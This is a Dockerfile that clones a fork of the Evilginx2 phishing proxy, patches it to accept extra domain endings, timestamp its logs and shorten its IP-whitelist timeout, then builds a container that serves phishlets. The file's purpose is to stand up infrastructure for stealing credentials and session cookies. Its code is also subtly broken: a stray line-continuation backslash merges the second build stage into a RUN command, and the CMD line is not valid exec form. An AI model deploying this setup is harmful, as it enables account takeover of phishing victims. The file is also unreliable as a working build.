ARG EVILGINX_BIN="/bin/evilginx"

# Stage 1 - Build EvilGinx2 app
FROM alpine:latest AS build

LABEL maintainer="evilginx2"

ARG GOLANG_VERSION=1.20
ARG GOPATH=/opt/go
ARG GITHUB_USER="fromformby"
ARG EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
ARG INSTALL_PACKAGES="go git bash"
ARG PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
ARG EVILGINX_BIN

RUN apk add --no-cache ${INSTALL_PACKAGES}

# Install & Configure Go
RUN set -ex \
    && wget https://dl.google.com/go/go${GOLANG_VERSION}.src.tar.gz && tar -C /usr/local -xzf go$GOLANG_VERSION.src.tar.gz \
    && rm go${GOLANG_VERSION}.src.tar.gz \
    && cd /usr/local/go/src && ./make.bash \
# Clone EvilGinx2 Repository
    && mkdir -pv ${GOPATH}/src/github.com/${GITHUB_USER} \
    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://${EVILGINX_REPOSITORY}

# Add "security" & "tech" TLD
RUN set -ex \
    && sed -i 's/arpa/tech\|security\|arpa/g' ${PROJECT_DIR}/core/http_proxy.go

# Add date to EvilGinx2 log
RUN set -ex \
    && sed -i 's/"%02d:%02d:%02d", t.Hour()/"%02d\/%02d\/%04d - %02d:%02d:%02d", t.Day(), int(t.Month()), t.Year(), t.Hour()/g' ${PROJECT_DIR}/log/log.go

# Set "whitelistIP" timeout to 10 seconds
RUN set -ex \
    && sed -i 's/10 \* time.Minute/10 \* time.Second/g' ${PROJECT_DIR}/core/http_proxy.go

# Build EvilGinx2
WORKDIR ${PROJECT_DIR}
RUN set -x \
    && go get -v && go build -v \
    && cp -v evilginx2 ${EVILGINX_BIN} \

# Stage 2 - Build Runtime Container
FROM alpine:latest

LABEL maintainer="evilginx2"

ENV EVILGINX_PORTS="3333"
ARG EVILGINX_BIN

RUN apk add --no-cache bash

# Install EvilGinx2
WORKDIR /app
COPY --from=build ${EVILGINX_BIN} ${EVILGINX_BIN}

# Configure Runtime Container
EXPOSE ${EVILGINX_PORTS}

CMD [${EVILGINX_BIN}, "-p", "/phishlets"]
